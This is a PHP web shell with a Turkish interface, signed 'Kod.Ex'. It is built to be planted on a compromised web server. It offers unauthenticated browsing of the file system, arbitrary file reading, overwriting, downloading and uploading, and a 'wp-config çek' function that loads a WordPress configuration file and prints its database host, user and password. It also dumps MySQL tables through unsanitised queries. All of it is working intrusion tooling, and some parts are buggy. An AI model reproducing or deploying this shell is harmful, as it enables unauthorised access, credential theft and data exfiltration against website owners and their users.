<?php
error_reporting(0);
$localIP = getHostByName(getHostName());
$dizin = "bos";
$icerik = "bos";
function dizin($path = null) {
    if(empty($path)) {
        $path = __DIR__;
    }
    $dizin = scandir($path);
    return $dizin;
}
function dizin2($path) {
   
    $dizin = scandir($path);
    return $dizin;
}

if(isset($_GET["type"])) {
    $type = htmlspecialchars($_GET["type"]);


    if($type === "searchdir") {
        if(isset($_GET["select"])) {
            $location = htmlspecialchars($_GET["loc"]);
            $dizin = dizin2($location);
        } else if(isset($_GET["loc"])) {
            $location = htmlspecialchars($_GET["loc"]);
            $dizin = dizin(__DIR__."/".$location);
        }
    } else if($type === "searchfile") {
        if(isset($_GET["loc2"])) {
            $icerik = file($_GET["loc2"]);
        }
        if(isset($_GET["loc"])) {
            $location = htmlspecialchars($_GET["loc"]);
            $dizin = dizin(__DIR__."/".$location);
        }
    }


}
function getloc($data) {
    if(isset($_GET["type"])) {

        if(!empty($_GET["loc"])) {
            $loc = $_GET["loc"];
            return $loc.$data;
        }
        
    } else {
        return $data;
    }
}

function typesearch($filePath) {
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $filePath);
    finfo_close($finfo);

    return $mimeType;
}

function klasormu($type) {
    if($type === "Klasör" || $type === "directory") {
        return true;
    }else {
        return false;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if(isset($_POST["textarea"])) {
        $icerik = $_POST['textarea'];

        $dosyaYolu = $_GET["loc2"];

        // İçeriği dosyaya yazın
        $kontrol = file_put_contents($dosyaYolu, $icerik);
        if($kontrol) {
            echo '<meta http-equiv="refresh" content="0;">';

        }
    }

}

if(isset($_GET["action"])) {
    if($_GET["action"] === "download") {
        if(isset($_GET["loc3"])) {
            $dosyaYolu = $_GET["loc3"];

        if (file_exists($dosyaYolu)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($dosyaYolu));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($dosyaYolu));
            readfile($dosyaYolu);
            exit;
        } else {
            echo 'İndirilecek dosya bulunamadı.';
        }
        }
    }
}

if(isset($_GET["select"])) {
    if($_GET["select"] === "wpconfig") {
        if(isset($_GET["loc5"])) {
            $dosya_yolu = $_GET["loc5"];
            require("$dosya_yolu");
            $wpconfig["db_name"] = DB_NAME;
            $wpconfig["db_user"] = DB_USER;
            $wpconfig["db_password"] = DB_PASSWORD;
            $wpconfig["db_host"] = DB_HOST;
            $wpconfig["table_prefix"] = $table_prefix;
        }
    }
}




?>








<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Helpers</title>
</head>
<style>
    body {
        background: #2b3035;
    }
    :root {
  --primary-color: white;
  --secondary-color: rgb(61, 68, 73);
  --highlight-color: #3282b8;

  --dt-status-available-color: greenyellow;
  --dt-status-away-color: lightsalmon;
  --dt-status-offline-color: lightgray;

  --dt-padding: 12px;
  --dt-padding-s: 6px;
  --dt-padding-xs: 2px;

  --dt-border-radius: 3px;

  --dt-background-color-container: #2a3338;
  --dt-border-color: var(--secondary-color);
  --dt-bg-color: var(--highlight-color);
  --dt-text-color: var(--primary-color);
  --dt-bg-active-button: var(--highlight-color);
  --dt-text-color-button: var(--primary-color);
  --dt-text-color-active-button: var(--primary-color);
  --dt-hover-cell-color: var(--highlight-color);
  --dt-even-row-color: var(--secondary-color);
  --dt-focus-color: var(--highlight-color);
  --dt-input-background-color: var(--secondary-color);
  --dt-input-color: var(--primary-color);
}

.material-icons {
  font-size: 16px;
}

.datatable-container {
  font-family: sans-serif;
  background-color: var(--dt-background-color-container);
  border-radius: var(--dt-border-radius);
  color: var(--dt-text-color);
  max-width: 1140px;
  min-width: 950px;
  margin: 0 auto;
  font-size: 12px;
}

.datatable-container .header-tools {
  border-bottom: solid 1px var(--dt-border-color);
  padding: var(--dt-padding);
  padding-left: 0;
  display: flex;
  align-items: baseline;
}

.datatable-container .header-tools .search {
  width: 30%;
}

.datatable-container .header-tools .search .search-input {
  width: 100%;
  height: calc(1.5em + 0.75rem + 2px);
  padding: 0.375rem 0.75rem;
  background-color: var(--dt-input-background-color);
  display: block;
  box-sizing: border-box;
  border-radius: var(--dt-border-radius);
  border: solid 1px var(--dt-border-color);
  color: var(--dt-input-color);
}

.datatable-container .header-tools .tools {
  width: 70%;
}

.datatable-container .header-tools .tools ul {
  margin: 0;
  padding: 0;
  display: flex;
  justify-content: start;
  align-items: baseline;
}

.datatable-container .header-tools .tools ul li {
  display: inline-block;
  margin: 0 var(--dt-padding-xs);
  align-items: baseline;
}

.datatable-container .footer-tools {
  padding: var(--dt-padding);
  display: flex;
  align-items: baseline;
}

.datatable-container .footer-tools .list-items {
  width: 50%;
}

.datatable-container .footer-tools .pages {
  margin-left: auto;
  margin-right: 0;
  width: 50%;
}

.datatable-container .footer-tools .pages ul {
  margin: 0;
  padding: 0;
  display: flex;
  align-items: baseline;
  justify-content: flex-end;
}

.datatable-container .footer-tools .pages ul li {
  display: inline-block;
  margin: 0 var(--dt-padding-xs);
}

.datatable-container .footer-tools .pages ul li button,
.datatable-container .header-tools .tools ul li button {
  color: var(--dt-text-color-button);
  width: 100%;
  box-sizing: border-box;
  border: 0;
  border-radius: var(--dt-border-radius);
  background: transparent;
  cursor: pointer;
}

.datatable-container .footer-tools .pages ul li button:hover,
.datatable-container .header-tools .tools ul li button:hover {
  background: var(--dt-bg-active-button);
  color: var(--dt-text-color-active-button);
}

.datatable-container .footer-tools .pages ul li span.active {
  background-color: var(--dt-bg-color);
  border-radius: var(--dt-border-radius);
}

.datatable-container .footer-tools .pages ul li button,
.datatable-container .footer-tools .pages ul li span,
.datatable-container .header-tools .tools ul li button {
  padding: var(--dt-padding-s) var(--dt-padding);
}

.datatable-container .datatable {
  border-collapse: collapse;
  width: 100%;
}

.datatable-container .datatable,
.datatable-container .datatable th,
.datatable-container .datatable td {
  padding: var(--dt-padding) var(--dt-padding);
}

.datatable-container .datatable th {
  font-weight: bolder;
  text-align: left;
  border-bottom: solid 1px var(--dt-border-color);
}

.datatable-container .datatable td {
  border-bottom: solid 1px var(--dt-border-color);
}

.datatable-container .datatable tbody tr:nth-child(even) {
  background-color: var(--dt-even-row-color);
}

.datatable-container .datatable tbody tr:hover {
  background-color: var(--dt-hover-cell-color);
}

.datatable-container .datatable tbody tr .available::after,
.datatable-container .datatable tbody tr .away::after,
.datatable-container .datatable tbody tr .offline::after {
  display: inline-block;
  vertical-align: middle;
}

.datatable-container .datatable tbody tr .available::after {
  content: "Online";
  color: var(--dt-status-available-color);
}

.datatable-container .datatable tbody tr .away::after {
  content: "Away";
  color: var(--dt-status-away-color);
}

.datatable-container .datatable tbody tr .offline::after {
  content: "Offline";
  color: var(--dt-status-offline-color);
}

.datatable-container .datatable tbody tr .available::before,
.datatable-container .datatable tbody tr .away::before,
.datatable-container .datatable tbody tr .offline::before {
  content: "";
  display: inline-block;
  width: 10px;
  height: 10px;
  margin-right: 10px;
  border-radius: 50%;
  vertical-align: middle;
}

.datatable-container .datatable tbody tr .available::before {
  background-color: var(--dt-status-available-color);
}

.datatable-container .datatable tbody tr .away::before {
  background-color: var(--dt-status-away-color);
}

.datatable-container .datatable tbody tr .offline::before {
  background-color: var(--dt-status-offline-color);
}
a{
    color:green;
    font-size:14px;
    text-decoration: none; 

}
a:visited{
    color:red;
}
textarea {
    width: 250%;
  height: 500px;
  box-sizing: border-box;
  resize: none;
}
.texteditor {
   
    position:fixed;
  justify-content: center;
  align-items: center;
}
.texteditor button{
    background-color:red;

}
.pompa-input{
    width: 20%;
  height: calc(1.5em + 0.75rem + 2px);
  padding: 0.375rem 0.75rem;
  background-color: var(--dt-input-background-color);
  display: block;
  box-sizing: border-box;
  border-radius: var(--dt-border-radius);
  border: solid 1px var(--dt-border-color);
  color: var(--dt-input-color);
}

</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<body>
    

<div class="datatable-container">
  <!-- ======= Header tools ======= -->
  <div class="header-tools">
    <div class="tools">
      <ul>
        <li>
          <button>
          <i class="fa fa-plus-circle" aria-hidden="true"></i> Eskiye Git

          </button>
        </li>
        <li>
           <a href="?select=wpconfig&type=searchdir&loc=<?= getloc("/") ?>">

          <button>
          <i class="fa fa-plug" aria-hidden="true"></i> wp-config çek
          </button></a>
        </li>
        <li>            
            <a href="?select=ara&type=searchdir&loc=<?= getloc("/") ?>">

          <button>
          <i class="fa fa-folder" aria-hidden="true"></i> Konuma Git
          </button></a>
        </li>
      </ul>
      <?php
      if(isset($_GET["select"])) {
        if($_GET["select"] === "ara") {
            ?>
<form action="" method="get">
      <input class="pompa-input" type="hidden" name="type" value="searchdir" id="">
      <input class="pompa-input" type="hidden" name="select" value="ara" id="">

      <input class="pompa-input" type="text" name="loc" id="">
      <ul>
        <li>
        <button>
          <i class="fa fa-folder" aria-hidden="true"> Git</i>
          </button>
        </li>
        </ul>
      </form>
            <?php
        } else if($_GET["select"] === "wpconfig") {
            ?>
        <form action="" method="get">
        <input class="pompa-input" type="hidden" name="type" value="searchdir" id="">
        <input class="pompa-input" type="hidden" name="select" value="wpconfig" id="">
        <input class="pompa-input" type="hidden" name="loc" value="<?= getloc("/") ?>" id="">
        <input class="pompa-input" type="text" name="loc5" id="">
        <ul>
            <li>
            <button>
            <i class="fa fa-folder" aria-hidden="true"> Git</i>
            </button>
            </li>
            </ul>
        </form>
        
            <?php
            if(isset($wpconfig)) {
                ?>
                <span>
                    host: <b><?= $wpconfig["db_host"] ?></b><br/>
                    user: <b><?= $wpconfig["db_user"] ?></b><br/>
                    password: <b><?= $wpconfig["db_password"] ?></b><br/>
                    database: <b><?= $wpconfig["db_name"] ?></b><br/>
                    table prefix: <b><?= $wpconfig["table_prefix"] ?></b><br/>
                </span>
                <?php
            }
        }
      }?>
   
    </div>

    <div class="search">
        <span>
        <h4>IP:<b><?= $localIP ?></b>
        
      <?php
      echo __DIR__."/".getloc("");
      ?></h4></span>
    </div>
  </div>

<?php

if($icerik != "bos") {
    ?>
      <div class="texteditor">
    <form action="" method="post">
        <textarea name="textarea" id="textarea" cols="30" rows="10">
            <?php
             foreach ($icerik as $satir) {
                $satir = htmlspecialchars($satir);
                echo $satir;
            }
            ?>
        </textarea>
        <button type="submit">Kaydet</button>
        <a href="?type=searchfile&loc=<?= $_GET["loc"] ?>"> <button type="button">İptal</button></a>

    </form>
  </div>
  <?php
   
}
?>


  <!-- ======= Table ======= -->
  <table class="datatable">
    <thead>
      <tr>
        <th><input type="checkbox" /></th>
        <th>Dosya Adı</th>
        <th>Dosya Türü</th>
        <th>Dosya Boyutu</th>
        <th>Dosya Yolu</th>
        <th>İşlem</th>
      </tr>
    </thead>

    <tbody>
    <?php




if($dizin === "bos") {
    $dizin = dizin();
} 
if (!empty($dizin)) {
    // Dosyaları türüne göre sırala
    usort($dizin, function ($a, $b) {
        $aIsDir = is_dir($a);
        $bIsDir = is_dir($b);

        if ($aIsDir === $bIsDir) {
            // Eğer her ikisi de klasör veya her ikisi de dosya ise sıralamayı isme göre yap
            return strcasecmp(basename($a), basename($b));
        }

        // Eğer biri klasör, diğeri dosya ise klasörü önce getir
        return $aIsDir ? -1 : 1;
    });

    foreach ($dizin as $data) {
        $name = basename($data);
        $type = is_dir($data) ? 'Klasör' : filetype($data);
        if ($type === "Klasör") {
            
        } else if($type === "file") {

        } else {
            $filePath = __DIR__ . "/" . $location . $data;
            $type = typesearch($filePath);
            
        }
        $boyut = is_dir($data) ? '-' : filesize($data);
        ?>
        <tr>
            <td>
                <input type="checkbox" />
            </td>
            <td>
                <?php
                
                $kontrol = klasormu($type);
                print_r($kontrol);
                if(klasormu($type)){?>
                <a href="?type=searchdir&loc=<?= klasormu($type) ? urlencode(getloc($name) . '/') : urlencode(getloc($name)) ?>">
                    <?= is_dir($data) ? $name . '/' : $name ?>
                </a><?php

                } else {?>
                    <a href="?type=searchfile&loc=<?= getloc("/") ?>&loc2=./<?= getloc($name) ?>">
                    <?= is_dir($data) ? $name . '/' : $name ?>
                </a> <?php
                }
                ?>
              
            </td>

            <td><?= $type ?></td>
            <td><?= $boyut ?></td>
            <td><?= $data ?></td>
            <td>
                <?php
                if(klasormu($type)) {?>
                    <a href=""><i class="fa fa-pencil" style="color:gray" aria-hidden="true"></i></a>
                    <a href=""><i class="fa fa-download" style="color:gray" aria-hidden="true"></i></a><?php
                } else {?>
                    <a href="?type=searchfile&loc=<?= getloc("") ?>&loc2=./<?= getloc($name) ?>"><i class="fa fa-pencil" style="color:green" aria-hidden="true"></i></a>
                    <a href="?type=searchfile&action=download&loc=<?= getloc("") ?>&loc3=./<?= getloc($name) ?>"><i class="fa fa-download" style="color:green"  aria-hidden="true"></i></a>

<?php
                } ?>
                <a href="?type=delete&loc=<?= $data ?>"><i class="fa fa-trash" aria-hidden="true"></i></a>
            </td>
        </tr>
        <?php
    }
}
?>

      
    </tbody>
  </table>

  <!-- ======= Footer tools ======= -->
  <div class="footer-tools">
    <div class="list-items">
      Coded By <b>Kod.Ex</b>
        </div>


  </div>
</div>


<form enctype="multipart/form-data" action="#"  method="POST">
 
 <table border="1" cellpadding="4" align="center">
 <tr>
 <td>Dosya seçiniz:</td>
 <td><input type="FILE" name="dosya"></td>
 </tr>
 <tr>
 <td></td>
 <td><input type="submit" value="Yukle"></td>
 </tr>
 </table>
 </form>


 <form action="#" method="POST">
 <table border="1" cellpadding="3" align="center">

    <tr>
        <td>Host <td>
        <td> <input type="text" name="host" palaceholder="Örn: localhost">  </td>
    </tr>
    <tr>
        <td> Kullanıcı Adı </td>
        <td> <input type="text" name="name" palaceholder="Örn: root"> </td>

    </tr>
    <tr>
        <td> Şifre </td>
        <td> <input type="text" name="pass" palaceholder="Örn: Şifre"> </td>
    </tr>
    <tr>
        <td>Veri Tabanı</td>
        <td> <input type="text" name="veritabani" palaceholder="Veritabani"> <td>
</tr>

<tr>
<td> Seçenek</td>
<td><select name="secenek">
        <option value="0">Tüm Kolonları Göster</option>
        <option value="1">Girilen Kolonu Yazdır</option>
</select>
<input type="text" name="girdi" palaceholder="ek girdi"> </td>
</tr>
    <td><input type="submit" value="Yukle"></td>

</table>




</form>

<form action="#" method="POST">
 <table border="1" cellpadding="4" align="center">


<tr>
<td> Seçenek</td>
<td><select name="secenek2">
        <option value="0">Girileni Listele</option>
        <option value="1">Girileni İndir</option>
        <option value="2">Girileni Kopyala</option>
        <option value="3">wp-config Çek</option>


</select>
<input type="text" name="girdi" palaceholder="ek girdi"> </td>
</tr>
    <td><input type="submit" value="Yukle"></td>

</table>




</form>

</head>
<body> <center>
<?php

if (isset($_POST["secenek2"])) {
    $secenek = $_POST["secenek2"];
    if ($secenek == "0") {
        $dizin = $_POST["girdi"];
        $dosyalar = scandir($dizin);

        foreach ($dosyalar as $dosya) {
        
          echo $dosya . "<br />";
        
        }
    } else if($secenek == "1") {
        $dosya_yolu = $_POST["girdi"];
        header($_SERVER['SERVER_PROTOCOL'].' 200 OK');
        header("Content-Type: application/zip");
        header("Content-Transfer-Encoding: Binary");
        header("Content-Length: ".filesize($satir["dosya_yolu"]));
        header("Content-Disposition: attachment; filename=\"".basename($dosya_yolu)."\"");
        readfile($dosya_yolu);



    } else if($secenek == "2") {
        $dosya_yolu = $_POST["girdi"];
        $yeni = './'.rand().".txt";

        if (!copy($dosya_yolu, $yeni)) {
            echo "$dosya_yolu kopyalanamadı...\n";
        } else {
            echo $yeni;
        }
    } else if($secenek == "3") {
        $dosya_yolu = $_POST["girdi"];

        require("$dosya_yolu");
        echo("DB_NAME=".DB_NAME."; DB_USER=".DB_USER."; DB_PASSWORD=".DB_PASSWORD."; DB_HOST=".DB_HOST);
        echo"<br>";

    }
}



if (isset($_POST["veritabani"])) {
    $db = $_POST["veritabani"];
    $user = $_POST["name"];
    $pass = $_POST["pass"];
    $host = $_POST["host"];
    
    $secenek = $_POST["secenek"];

    if (isset($secenek)) {
        if ($secenek == "0") {
            $pdo = new PDO("mysql:host=$host;dbname=$db", "$user", "$pass");
            $sql = 'SHOW TABLES';
                
                $query = $pdo->query($sql);
                $sonuc = $query->fetchAll(PDO::FETCH_COLUMN);
                echo "<br> <font color='red'><h3> Kolon Listesi </h3> </font><br>";
                foreach ($sonuc as $a) {
                    echo "Table: ".$a."<br>";
                   
                }
        } else if($secenek == "1"){
            $girdi = $_POST["girdi"];
            $pdo = new PDO("mysql:host=$host;dbname=$db", "$user", "$pass");
            $sql = 'SHOW TABLES';
            $sorgu = $pdo->prepare("SELECT * FROM $girdi");
 
             $sorgu->execute();
                
                $sayi = 0;
                echo "<br> <font color='red'><h3> İçerik Listesi </h3> </font><br>";
               $zirve = $sorgu->fetchAll();
               print_r($zirve);
        }
     

      
        
    } else {
        $ara=$pdo->query("select * from $colon where $where = $deger ");//isim sütununda a harfi geçenleri çektik.
        $result = $ara->fetchAll();
       


    }

  





} else {
    
}



if (isset($_POST)) {
    $dizin = 'backup/';

    if (file_exists($dizin)) {
        $yuklenecek_dosya = $dizin . basename($_FILES['dosya']['name']);
 
        if (move_uploaded_file($_FILES['dosya']['tmp_name'], $yuklenecek_dosya))
        {
        echo "Dosya başarıyla yüklendi.<br>";
         
        } else {
            echo "Dosya yüklenemedi!\n";
        }
    } else {
        mkdir('backup', 0777, true);
        $dizin = 'backup/';
        $yuklenecek_dosya = $dizin . basename($_FILES['dosya']['name']);
 
        if (move_uploaded_file($_FILES['dosya']['tmp_name'], $yuklenecek_dosya))
        {
        echo "Dosya başarıyla yüklendi.<br>";
         
        } else {
        }
    }



} else {

}











?>
</body>
</html>

